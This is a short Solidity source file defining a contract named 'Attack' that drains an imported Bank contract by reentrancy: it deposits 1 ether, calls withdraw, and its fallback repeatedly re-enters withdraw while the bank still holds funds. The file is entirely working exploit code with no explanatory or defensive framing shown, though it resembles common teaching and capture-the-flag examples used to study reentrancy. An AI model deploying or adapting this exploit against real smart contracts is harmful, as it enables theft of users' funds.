pragma solidity 0.8.17;

import { Bank } from "./Bank.sol";

contract Attack {
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() external payable {
        Bank(bank).deposit{ value: 1 ether }();
        Bank(bank).withdraw();
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            Bank(bank).withdraw();
        }
    }
}
